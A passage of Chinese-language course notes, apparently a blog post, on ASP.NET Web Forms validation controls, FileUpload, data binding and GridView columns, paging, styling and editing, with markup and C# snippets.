ErrorMessage&#x3D;&quot;出生日期在1966-1-1到1997-12-31之间&quot; MaximumValue&#x3D;&quot;1997-12-31&quot; MinimumValue&#x3D;&quot;1966-1-1&quot; ControlToValidate&#x3D;&quot;txtBornDate&quot; Type&#x3D;&quot;Date&quot;&gt;&lt;&#x2F;asp:RangeValidator&gt;……</span><br></pre></td></tr></table></figure></li></ul><h4><span id="3-comparevalidator">3. <strong>CompareValidator</strong></span></h4><ul><li><p><strong>CompareValidator</strong>控件是比较验证控件，可以将目标控件中的值与指定的值或指定控件中的值进行比较。</p></li><li><p>常用于在用户注册时，前后输入的密码是否一致。</p></li><li><p><strong>CompareValidator</strong>控件使用<strong>ControlToCompare</strong>属性指定用于比较的控件，使用ValueToCompare属性指定用于比较的值。</p></li><li><p><strong>CompareValidator</strong>控件的<strong>Operator</strong>属性，用于指定比较的方式。</p></li><li><table><thead><tr><th>取值</th><th>说明</th></tr></thead><tbody><tr><td>DataTypeCheck</td><td>检查目标控件输入的数据类型是否和Type属性指定的一致</td></tr><tr><td>Equal</td><td>检查目标控件和指定值是否相等</td></tr><tr><td>GreaterThan</td><td>检查目标控件是否大于指定值</td></tr><tr><td>GreaterThanEqual</td><td>检查目标控件是否大于或等于指定值</td></tr><tr><td>LessThan</td><td>检查目标控件是否小于指定值</td></tr><tr><td>LessThanEqual</td><td>检查目标控件是否小于或等于指定值</td></tr><tr><td>NotEqual</td><td>检查目标控件和指定值是否不相等</td></tr></tbody></table></li><li><p><img data-src="../images/mdImages/image-20200606150903125.png" alt="image-20200606150903125"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;asp:TextBox ID&#x3D;&quot;txtPwd2&quot; runat&#x3D;&quot;server&quot;  TextMode&#x3D;&quot;Password&quot;&gt;&lt;&#x2F;asp:TextBox&gt;</span><br><span class="line">          &lt;asp:RequiredFieldValidator ID&#x3D;&quot;RequiredFieldValidator3&quot; runat&#x3D;&quot;server&quot; ControlToValidate&#x3D;&quot;txtPwd2&quot; Display&#x3D;&quot;Dynamic&quot; ErrorMessage&#x3D;&quot;验证密码必填&quot; Text&#x3D;&quot;*&quot;&gt;&lt;&#x2F;asp:RequiredFieldValidator&gt;</span><br><span class="line">         &lt;asp:CompareValidator ID&#x3D;&quot;CompareValidator1&quot; runat&#x3D;&quot;server&quot; ErrorMessage&#x3D;&quot;密码不一致&quot; ControlToValidate&#x3D;&quot;txtPwd2&quot; ControlToCompare&#x3D;&quot;txtPwd&quot;   Operator&#x3D;&quot;Equal&quot; Type&#x3D;&quot;String&quot;&gt;&lt;&#x2F;asp:CompareValidator&gt;</span><br></pre></td></tr></table></figure></li><li><p><img data-src="../images/mdImages/image-20200606150955884.png" alt="image-20200606150955884"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;asp:TextBox ID&#x3D;&quot;txtPrice&quot; runat&#x3D;&quot;server&quot; &gt;&lt;&#x2F;asp:TextBox&gt;</span><br><span class="line">        &lt;asp:RequiredFieldValidator ID&#x3D;&quot;RequiredFieldValidator4&quot; runat&#x3D;&quot;server&quot; ControlToValidate&#x3D;&quot;txtPrice&quot; Display&#x3D;&quot;Dynamic&quot; ErrorMessage&#x3D;&quot;价格必填&quot; Text&#x3D;&quot;*&quot;&gt;&lt;&#x2F;asp:RequiredFieldValidator&gt;</span><br><span class="line">                &lt;asp:CompareValidator ID&#x3D;&quot;CompareValidator1&quot; runat&#x3D;&quot;server&quot; ErrorMessage&#x3D;&quot;价格格式有误&quot; ControlToValidate&#x3D;&quot;txtPrice&quot; Operator&#x3D;&quot;DataTypeCheck&quot; Type&#x3D;&quot;Currency&quot;&gt;&lt;&#x2F;asp:CompareValidator&gt;</span><br></pre></td></tr></table></figure></li></ul><h4><span id="4-regularexpressionvalidator">4. <strong>RegularExpressionValidator</strong></span></h4><ul><li><p><strong>RegularExpressionValidator</strong>控件是正则表达式验证控件。</p></li><li><p>正则表达式是一种描述格式模式的表达式。</p></li><li><p><strong>RegularExpressionValidator</strong>控件验证目标控件中输入的值和正则表达式描述的格式是否匹配，例如，验证用户输入的是否是合法的邮箱。</p></li><li><p><strong>RegularExpressionValidator</strong>控件提供了ValidatorExpression属性，指定匹配目标控件格式的正则表达式。</p></li><li><p>ASP.NET中内置了几个常用的正则表达式。</p></li><li><p><img data-src="../images/mdImages/image-20200606151125439.png" alt="image-20200606151125439"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;asp:TextBox ID&#x3D;&quot;txtEmail&quot; runat&#x3D;&quot;server&quot; &gt;&lt;&#x2F;asp:TextBox&gt;</span><br><span class="line">                &lt;asp:RequiredFieldValidator ID&#x3D;&quot;RequiredFieldValidator5&quot; runat&#x3D;&quot;server&quot; ControlToValidate&#x3D;&quot;txtEmail&quot; Display&#x3D;&quot;Dynamic&quot; ErrorMessage&#x3D;&quot;Email必填&quot; Text&#x3D;&quot;*&quot;&gt;&lt;&#x2F;asp:RequiredFieldValidator&gt;</span><br><span class="line">                &lt;asp:RegularExpressionValidator ID&#x3D;&quot;RegularExpressionValidator1&quot; runat&#x3D;&quot;server&quot; ErrorMessage&#x3D;&quot;Email格式有误&quot; ControlToValidate&#x3D;&quot;txtEmail&quot; ValidationExpression&#x3D;&quot;\w+([-+.&#39;]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*&quot;&gt;&lt;&#x2F;asp:RegularExpressionValidator&gt;</span><br></pre></td></tr></table></figure></li><li><p>内置的正则表达式往往不能满足实际的需求，常用的正则表达式，如下所示。</p></li><li><table><thead><tr><th>正则表达式</th><th>说明</th></tr></thead><tbody><tr><td>^[A-Za-z]+$</td><td>只能输入由26个英文字母组成的字符串</td></tr><tr><td>^\d{n}$</td><td>只能输入n位数字</td></tr><tr><td>^\d{m,n}$</td><td>只能输入m~n位数字</td></tr><tr><td>^\d{n,}$</td><td>只能输入至少n位数字</td></tr><tr><td>^[\u4e00-\u9fa5]+$</td><td>只能输入汉字</td></tr><tr><td>^[1-9][0-9]*$</td><td>只能输入正整数</td></tr><tr><td>^(-)?[0-9]+(.[0-9]{2})?$</td><td>输入正负整数或小数，小数只能保留2位</td></tr></tbody></table></li></ul><h4><span id="5-customvalidator">5. <strong>CustomValidator</strong></span></h4><ul><li>非空、范围和比较验证控件提供了常用的验证功能，正则表达式控件则基于正则表达式提供了强大的字符串规则验证功能，但仍然无法解决某些验证需求。</li><li><strong>CustomValidator</strong>控件是自定义验证控件，可以编写客户端脚本与服务器端脚本对数据进行验证，以确定用户的输入是否通过验证。</li><li><strong>CustomValidator</strong>提供了<strong>ClientValidationFunction</strong>属性，指定用于客户端脚本验证的脚本函数，<strong>OnServerValidate</strong>事件，指定服务器端验证的事件方法。</li><li><img data-src="../images/mdImages/image-20200606151313165.png" alt="image-20200606151313165"></li><li><img data-src="../images/mdImages/image-20200606151323986.png" alt="image-20200606151323986"></li><li><img data-src="../images/mdImages/image-20200606151335417.png" alt="image-20200606151335417"></li></ul><h4><span id="6-validationsummary">6. <strong>ValidationSummary</strong></span></h4><ul><li><p>ValidationSummary控件可用于汇总所验证控件的错误报告。</p></li><li><table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>DisplayMode</td><td>所有的错误信息显示的模式，包括三种。为List时，显示为列表；为BulletList时，显示为项目符合列表；为SingleParagraph时，显示为单行</td></tr><tr><td>HeaderText</td><td>显示在错误信息之前的提示信息</td></tr><tr><td>ShowSummary</td><td>是否在ValidationSummary控件处显示</td></tr><tr><td>ShowMessageBox</td><td>是否弹出MessageBox显示错误信息</td></tr></tbody></table></li><li><p><img data-src="../images/mdImages/image-20200606151410977.png" alt="image-20200606151410977"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;asp:ValidationSummary        ID&#x3D;&quot;ValidationSummary1“</span><br><span class="line">           runat&#x3D;&quot;server&quot;  </span><br><span class="line">           DisplayMode&#x3D;&quot;BulletList“</span><br><span class="line">          HeaderText&#x3D;&quot;错误信息有：&quot; </span><br><span class="line">          ShowSummary&#x3D;&quot;false&quot; </span><br><span class="line">          ShowMessageBox&#x3D;&quot;true&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure></li></ul><h4><span id="7-pageisvalid">7. <strong>Page.IsValid</strong></span></h4><ul><li>Page.IsValid是Page对象的IsValid属性。</li><li>该属性指示页面是否通过了验证，如果页面中验证控件都通过了验证，则Page.IsValid属性值为true，如果存在任何一个验证控件未通过验证，则Page.IsValid属性值为false。</li><li><img data-src="../images/mdImages/image-20200606151508353.png" alt="image-20200606151508353"></li><li><img data-src="../images/mdImages/image-20200606151519570.png" alt="image-20200606151519570"></li></ul><h4><span id="8-禁用验证">8. <strong>禁用验证</strong></span></h4><ul><li><p>在某些特定条件下，程序员需要避开验证。</p></li><li><p>禁用验证的方法：</p><ol><li><p>设置按钮的“CausesValidation”属性为“false”</p></li><li><p>将验证控件的“Enable”属性设置为“false”来禁用单个验证控件。</p></li><li><p>禁用验证控件的客户端验证时，设置验证控件的“EnableClientScript”属性为“false”。</p></li></ol></li></ul><h4><span id="9-文件上传控件">9. <strong>文件上传控件</strong></span></h4><ul><li><p>在ASP.NET中，用于上传文件的控件是FileUpload。</p></li><li><table><thead><tr><th>成员名称</th><th>成员类型</th><th>说明</th></tr></thead><tbody><tr><td>FileName</td><td>属性</td><td>获取客户端使用FileUpload控件上传的文件名称，不包括路径</td></tr><tr><td>PostedFile</td><td>属性</td><td>获取客户端使用FileUpload控件上传的文件对象，常利用该对象的SaveAs()方法，进行文件的上传</td></tr></tbody></table></li><li><p><img data-src="../images/mdImages/image-20200606151658311.png" alt="image-20200606151658311"></p></li></ul><h3><span id="2-总结">2. 总结</span></h3><ul><li><p><strong>RequiredFieldValidator</strong>用于验证必须填写的控件，在验证的目标控件的输入内容为空时显示错误信息。</p></li><li><p><strong>RangeValidator</strong>控件用于范围检查，常验证输入的值是否在指定的范围之内。</p></li><li><p><strong>CompareValidator</strong>控件是比较验证控件，可以将目标控件中的值与指定的值或指定控件中的值进行比较。</p></li><li><p><strong>RegularExpressionValidator</strong>控件验证目标控件中输入的值和正则表达式描述的格式是否匹配。</p></li><li><p><strong>CustomValidator</strong>控件由程序员编写客户端脚本与服务器端脚本对数据进行验证，以确定用户的输入是否通过验证。</p></li><li><p><strong>ValidationSummary</strong>控件用于汇总所验证控件的错误报告。</p></li><li><p>使用<strong>FileUpload</strong>控件进行文件的上传。</p></li></ul><h2><span id="第七章-数据绑定和gridview控件">第七章-数据绑定和GridView控件</span></h2><h3><span id="1-数据绑定">1. 数据绑定</span></h3><ul><li>通过用户界面（UI）来显示数据，是制作网页时经常需要处理的问题之一。</li><li>数据绑定是指将数据源中的数据与页面中的元素进行对应的操作。</li><li>用表格来显示数据是网站开发中一个常见需求，一般使用GridView、DataList、Repeater等数据绑定控件。</li><li>数据绑定控件用于将指定的数据源按一定的格式呈现在Web页面上。</li></ul><h4><span id="1-1-数据绑定机制">1-1 数据绑定机制</span></h4><ul><li><p>ASP.NET框架提供了数据绑定机制，使我们能快速地将数据源展示在页面上。</p></li><li><p>假设我们现在需要用下拉列表框显示所有车型的品牌，在没有数据绑定机制的情况下，需要用循环来逐一添加列表框的项。</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Brand&gt; brands &#x3D; bm.GetBrands();          </span><br><span class="line">   foreach (Brand each in brands)</span><br><span class="line">   &#123;</span><br><span class="line">      ddlBrand.Items.Add(new ListItem(each.BrandName, each.BrandId.ToString()));</span><br><span class="line">   &#125;</span><br><span class="line">   ddlBrand.Items.Insert(0, new ListItem(&quot;请选择&quot;, &quot;-1&quot;));</span><br></pre></td></tr></table></figure><h4><span id="1-2-数据绑定表达式语法">1-2 数据绑定表达式语法</span></h4><ul><li><strong>ASP.NET</strong>提供了数据绑定语法，可以将控件属性值绑定到数据。</li><li>数据绑定表达式包含在“<strong>&lt;%#</strong>”和“<strong>%&gt;</strong>”之间。</li><li>在绑定表达式中，可以使用变量、方法等，在页面处理过程中会执行表达式，将最终的结果呈现在绑定表    达式中。</li><li><img data-src="../images/mdImages/image-20200606152234148.png" alt="image-20200606152234148"></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;asp:Label  ID&#x3D;&quot;lblShowTime&quot; runat&#x3D;&quot;server&quot; Text&#x3D;&quot;&lt;%#DateTime.Now.ToLongTimeString() %&gt;&quot;&gt;&lt;&#x2F;asp:Label&gt;</span><br><span class="line">&lt;% protected void Page_Load(object sender, EventArgs e)</span><br><span class="line">&#123;</span><br><span class="line">    lblShowTime.DataBind();</span><br><span class="line">&#125; %&gt;</span><br></pre></td></tr></table></figure><h3><span id="2-gridview控件">2. GridView控件</span></h3><ul><li><p>GridView控件以表格的形式显示数据，功能很强大，除了可以实现数据的展示外，还可以实现分页、排序、编辑、删除等功能。</p></li><li><table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>AllowPaging</td><td>获取或设置一个值，该值指示是否启用分页功能</td></tr><tr><td>AllowSorting</td><td>获取或设置一个值，该值指示是否启用排序功能</td></tr><tr><td>AutoGenerateColumns</td><td>获取或设置一个值，该值指示是否为数据源中的每个字段自动创建绑定字段</td></tr><tr><td>DataKeyNames</td><td>获取或设置一个数组，该数组包含了显示在GridView控件中的项的主键字段的名称</td></tr><tr><td>DataKeys</td><td>获取一个DataKey对象集合，这些对象表示GridView控件中的每一行的数据键值</td></tr><tr><td>DataSource</td><td>获取或设置对象，数据绑定控件从该对象中检索其数据项列表</td></tr><tr><td>HorizontalAlign</td><td>获取或设置GridView控件在页面上的水平对齐方式</td></tr><tr><td>SortExpression</td><td>获取与正在排序的列关联的排序表达式</td></tr></tbody></table></li><li><table><thead><tr><th>名称</th><th>类型</th><th>说明</th></tr></thead><tbody><tr><td>PageIndexChanging</td><td>事件</td><td>在GridView控件处理分页操作时发生</td></tr><tr><td>RowDataBound</td><td>事件</td><td>将数据行绑定到GridView控件中发生</td></tr><tr><td>RowDeleting</td><td>事件</td><td>单击某一行的“删除”按钮时，在GridView控件删除该行之前发生</td></tr><tr><td>DataBind</td><td>方法</td><td>将数据源绑定到GridView控件</td></tr></tbody></table></li></ul><h4><span id="2-1-使用gridview控件呈现数据">2-1 使用GridView控件呈现数据</span></h4><ul><li><p><img data-src="../images/mdImages/image-20200606152455870.png" alt="image-20200606152455870"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">CarManager cm &#x3D; new CarManager();</span><br><span class="line">    protected void Page_Load(object sender, EventArgs e)</span><br><span class="line">    &#123;</span><br><span class="line">        if (!IsPostBack)</span><br><span class="line">        &#123;</span><br><span class="line">            bindCars();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#123;</span><br><span class="line">        try</span><br><span class="line">        &#123;</span><br><span class="line">           List&lt;Car&gt; cars&#x3D;cm.GetCars();</span><br><span class="line">           gvCars.DataSource &#x3D; cars;</span><br><span class="line">           gvCars.DataBind();</span><br><span class="line">        &#125;</span><br><span class="line">        catch (Exception ex)</span><br><span class="line">        &#123;</span><br><span class="line">            lblInfo.Text &#x3D; ex.Message;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li></ul><h4><span id="2-2-手动创建gridview列">2-2 手动创建GridView列</span></h4><ul><li>默认情况下，<strong>GridView</strong>的<strong>AutoGenerateColumns</strong>属性值为<strong>true</strong>，会自动为数据源中的每个字段或者对象中的每个属性创建一个<strong>GridView</strong>列。</li><li>大部分情况下，需要将<strong>AutoGenerateColumns</strong>属性值为false，然后根据需求手动控制<strong>GridView</strong>的列。</li><li><img data-src="../images/mdImages/image-20200606152759530.png" alt="image-20200606152759530"></li></ul><h4><span id="2-3-boundfield">2-3. BoundField</span></h4><ul><li>BoundField列用于显示普通文本，是默认的数据绑定列的类型，一般自动生成的列就是该类型。</li></ul><ol><li><p>DataField属性：指定列绑定的字段名或者属性名。</p></li><li><p>HeaderText属性：指定列标题</p></li><li><p>DataFormatString属性：指定数据显示的格式</p></li></ol><ul><li><p>{0:C}：设置列的内容格式是货币类型的</p></li><li><p>{0:D}：设置列的内容是数字</p></li><li><p>{0：yy-mm-dd}：设置列的内容格式是日期类型的</p></li><li><p><img data-src="../images/mdImages/image-20200606153936393.png" alt="image-20200606153936393"></p></li><li><p><img data-src="../images/mdImages/image-20200606153945726.png" alt="image-20200606153945726"></p></li><li><p><img data-src="../images/mdImages/image-20200606153955806.png" alt="image-20200606153955806"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;asp:GridView ID&#x3D;&quot;gvCars&quot; runat&#x3D;&quot;server&quot; HorizontalAlign&#x3D;&quot;Center&quot; AutoGenerateColumns&#x3D;&quot;False&quot;&gt;</span><br><span class="line">        &lt;Columns&gt;</span><br><span class="line">            &lt;asp:BoundField DataField&#x3D;&quot;CarName&quot; HeaderText&#x3D;&quot;车型名称&quot; &#x2F;&gt;</span><br><span class="line">            &lt;asp:BoundField DataField&#x3D;&quot;CarBrand.BrandName&quot; </span><br><span class="line">                     HeaderText&#x3D;&quot;品牌名称&quot; &#x2F;&gt;</span><br><span class="line">            &lt;asp:BoundField DataField&#x3D;&quot;OfficialPrice&quot; DataFormatString&#x3D;&quot;&#123;0:C&#125;万&quot;                                        HeaderText&#x3D;&quot;官方价格&quot; &#x2F;&gt;</span><br><span class="line">            &lt;asp:BoundField DataField&#x3D;&quot;Click&quot; HeaderText&#x3D;&quot;点击量&quot; &#x2F;&gt;</span><br><span class="line">        &lt;&#x2F;Columns&gt;</span><br><span class="line">    &lt;&#x2F;asp:GridView&gt;</span><br></pre></td></tr></table></figure></li></ul><h4><span id="2-4-imagefield">2-4 ImageField</span></h4><ul><li>​    <strong>ImageField</strong>可以在<strong>GridView</strong>控件的列中显示图片。</li><li><img data-src="../images/mdImages/image-20200617103405648.png" alt="image-20200617103405648"></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">……</span><br><span class="line">&lt;asp:ImageField DataImageUrlField&#x3D;&quot;Picture“</span><br><span class="line">          DataImageUrlFormatString&#x3D;&quot;~&#x2F;images&#x2F;&#123;0&#125;“</span><br><span class="line">          HeaderText&#x3D;&quot;实物图&quot;&gt;</span><br><span class="line">      &lt;ControlStyle Height&#x3D;&quot;80px&quot; Width&#x3D;&quot;100px&quot; &#x2F;&gt;</span><br><span class="line"> &lt;&#x2F;asp:ImageField&gt;</span><br><span class="line">……</span><br></pre></td></tr></table></figure><h4><span id="2-5-templatefield">2-5 TemplateField</span></h4><ul><li><strong>TemplateField</strong>列允许以模板的形式自定义数据绑定列的内容。 </li><li>模板字段的添加有两种方式：直接添加或者将现有列转换为模板字段。</li><li><img data-src="../images/mdImages/image-20200617103525824.png" alt="image-20200617103525824"></li><li>使用直接添加的方式增加<strong>GridView</strong>的第一列即实现多选的列</li><li><img data-src="../images/mdImages/image-20200617103615066.png" alt="image-20200617103615066"></li><li><img data-src="../images/mdImages/image-20200617103620533.png" alt="image-20200617103620533"></li><li><img data-src="../images/mdImages/image-20200617103625290.png" alt="image-20200617103625290"></li><li><img data-src="../images/mdImages/image-20200617103631240.png" alt="image-20200617103631240"></li><li>添加模板字段也可以将现有列转换为模板字段，假设将车型名称列转换为模板列，在“字段”窗口中，选择“车型名称”列，然后单击“将此字段转换<strong>TemplateField</strong>”链接。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">……</span><br><span class="line"> &lt;asp:TemplateField HeaderText&#x3D;&quot;车型名称&quot;&gt;</span><br><span class="line">     &lt;EditItemTemplate&gt;</span><br><span class="line">          &lt;asp:TextBox ID&#x3D;&quot;TextBox1&quot; runat&#x3D;&quot;server&quot; </span><br><span class="line">            Text&#x3D;&#39;&lt;%# Bind(&quot;CarName&quot;) %&gt;&#39;&gt;&lt;&#x2F;asp:TextBox&gt;</span><br><span class="line">     &lt;&#x2F;EditItemTemplate&gt;</span><br><span class="line">     &lt;ItemTemplate&gt;</span><br><span class="line">           &lt;asp:Label ID&#x3D;&quot;Label1&quot; runat&#x3D;&quot;server&quot;    Text&#x3D;&#39;&lt;%#Bind(&quot;CarName&quot;) %&gt;&#39;&gt;&lt;&#x2F;asp:Label&gt;</span><br><span class="line">     &lt;&#x2F;ItemTemplate&gt;</span><br><span class="line">&lt;&#x2F;asp:TemplateField&gt;</span><br><span class="line">……</span><br></pre></td></tr></table></figure><h4><span id="2-6-commandfield">2-6 CommandField</span></h4><ul><li><p><strong>CommandField</strong>列提供了用于执行选择、编辑或删除的预定义命令按钮。</p></li><li><p><img data-src="../images/mdImages/image-20200617103931004.png" alt="image-20200617103931004"></p></li><li><p>增加GridView的“删除”列</p></li><li><p><img data-src="../images/mdImages/image-20200617103949948.png" alt="image-20200617103949948"></p></li><li><p>“删除”列在源文件产生的代码如下所示。</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">……</span><br><span class="line">&lt;asp:CommandField </span><br><span class="line">    ButtonType&#x3D;&quot;Button“</span><br><span class="line">    DeleteText&#x3D;&quot;删除“</span><br><span class="line">    HeaderText&#x3D;&quot;删除“</span><br><span class="line">   ShowDeleteButton&#x3D;&quot;True&quot; &#x2F;&gt;</span><br><span class="line">……</span><br></pre></td></tr></table></figure><h4><span id="2-7-hyperlinkfield">2-7 HyperLinkField</span></h4><ul><li><strong>HyperLinkField</strong>列允许显示一个超链接。</li><li><img data-src="../images/mdImages/image-20200617104046705.png" alt="image-20200617104046705"></li><li>在<strong>GridView</strong>中增加一列显示一个指向车型的详细页面的超链接</li><li><img data-src="../images/mdImages/image-20200617104137248.png" alt="image-20200617104137248"></li><li>“详细”列在源文件中产生的代码如下所示。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">……</span><br><span class="line">&lt;asp:HyperLinkField    DataNavigateUrlFields&#x3D;&quot;CarId&quot;  </span><br><span class="line"> Text&#x3D;&quot;详细&quot; DataNavigateUrlFormatString&#x3D;&quot;~&#x2F;DetailCar.aspx?CarId&#x3D;&#123;0&#125;“</span><br><span class="line"> HeaderText&#x3D;&quot;详细&quot; &#x2F;&gt;</span><br><span class="line">……</span><br></pre></td></tr></table></figure><h4><span id="2-8-gridview的分页">2-8 GridView的分页</span></h4><ul><li><strong>GridView</strong>自带分页功能，通过设置相关属性并实现分页事件的处理程序就能完成分页功能.</li><li><img data-src="../images/mdImages/image-20200617104241059.png" alt="image-20200617104241059"></li><li><img data-src="../images/mdImages/image-20200617104258110.png" alt="image-20200617104258110"></li></ul><h4><span id="2-9-设置gridview的样式">2-9 设置GridView的样式</span></h4><ul><li>GridView使用表格显示数据，默认的显示样式，有时不符合我们的需求，可以更改表格的显示样式来美化界面。</li><li><img data-src="../images/mdImages/image-20200617104337004.png" alt="image-20200617104337004"></li><li>除了使用自带的样式外，还可以自定义<strong>GridView</strong>的显示</li><li><img data-src="../images/mdImages/image-20200617104423716.png" alt="image-20200617104423716"></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">……</span><br><span class="line">&lt;asp:GridView ID&#x3D;&quot;gvCars&quot; runat&#x3D;&quot;server&quot; HorizontalAlign&#x3D;&quot;Center&quot; AutoGenerateColumns&#x3D;&quot;False&quot; style&#x3D;&quot;margin-left: 3px&quot; AllowPaging&#x3D;&quot;True&quot; PageSize&#x3D;&quot;3&quot; BackColor&#x3D;&quot;White&quot; BorderColor&#x3D;&quot;#6666FF&quot; BorderStyle&#x3D;&quot;Dotted&quot; BorderWidth&#x3D;&quot;2px&quot; OnPageIndexChanging&#x3D;&quot;gvCars_PageIndexChanging&quot; Width&#x3D;&quot;700px&quot;&gt;</span><br><span class="line">      &lt;AlternatingRowStyle BackColor&#x3D;&quot;White&quot; &#x2F;&gt;</span><br><span class="line">      &lt;Columns&gt;</span><br><span class="line">           &lt;!—代码省略--&gt;</span><br><span class="line">      &lt;&#x2F;Columns&gt;</span><br><span class="line">      &lt;PagerStyle HorizontalAlign&#x3D;&quot;Center&quot; VerticalAlign&#x3D;&quot;Middle&quot; &#x2F;&gt;</span><br><span class="line">      &lt;RowStyle BackColor&#x3D;&quot;#CCFF33&quot; HorizontalAlign&#x3D;&quot;Center&quot; VerticalAlign&#x3D;&quot;Middle&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;asp:GridView&gt;</span><br><span class="line">……</span><br></pre></td></tr></table></figure><h3><span id="3-总结">3. <strong>总结</strong></span></h3><ul><li><p>ASP.NET框架提供了数据绑定机制，使我们能快速地将数据源展示在页面上。</p></li><li><p>ASP.NET提供了数据绑定语法，可以将控件属性值绑定到数据，数据绑定表达式包含在“&lt;%#”和“%&gt;”之间。</p></li><li><p>通过调用<strong>DataBind</strong>()方法计算绑定表达式的值，控件才会显示数据。</p></li><li><p><strong>GridView</strong>控件以表格的形式显示数据，功能很强大，除了可以实现数据的展示外，还可以实现分页、排序、编辑、删除等功能。</p></li><li><p>手动添加<strong>GridView</strong>列时，可以选择列的类型有：<strong>BoundField</strong>、<strong>CheckBoxField</strong>、<strong>CommandField</strong>、<strong>HyperLinkField</strong>、<strong>ImageField</strong>、<strong>TemplateField</strong>等。</p></li><li><p>实现<strong>GridView</strong>的<strong>RowDeleting</strong>事件的处理程序，完成单行删除的功能。</p></li></ul><h2><span id="第八章-gridview控件的使用二">第八章 GridView控件的使用（二）</span></h2><h4><span id="1-gridview控件的编辑功能">1. GridView控件的编辑功能</span></h4><ul><li><p>对数据常用的操作除了展示、删除外，还需要能进行修改。</p></li><li><p>GridView对数据的修改如同Excel电子表格一样方便。</p></li><li><p><img data-src="../images/mdImages/image-20200617104857815.png" alt="image-20200617104857815"></p></li><li><p>实现GridView的编辑功能的基本步骤如下所述</p><ol><li><p>在数据库中创建存储过程“<strong>usp_UpdateCar</strong>”封装修改指定编号车型的名称、品牌、实物图文件名、官方价格的功能。</p></li><li><p>在解决方案的数据访问层和逻辑业务层中添加修改车型的方法。</p></li><li><p>在表示层的“<strong>CarList.aspx</strong>”页面中，添加<strong>GridView</strong>的“编辑”列。</p></li><li><p>运行“<strong>CarList.aspx</strong>”页面，单击<strong>GridView</strong>某一行的“编辑”按钮，会触发<strong>GridView</strong>的<strong>RowEditing</strong>事件</p><ul><li><img data-src="../images/mdImages/image-20200617105042535.png" alt="image-20200617105042535"></li><li><img data-src="../images/mdImages/image-20200617105425454.png" alt="image-20200617105425454"></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">……</span><br><span class="line">&lt;asp:CommandField ButtonType&#x3D;&quot;Button&quot;  EditText&#x3D;&quot;编辑&quot; HeaderText&#x3D;&quot;编辑&quot;   ShowEditButton&#x3D;&quot;True&quot; &#x2F;&gt;</span><br><span class="line">……</span><br></pre></td></tr></table></figure></li><li><p>点击量在编辑时不可更改，需要设置<strong>ReadOnly</strong>为<strong>true</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;asp:BoundField DataField&#x3D;&quot;Click&quot; HeaderText&#x3D;&quot;点击量&quot;  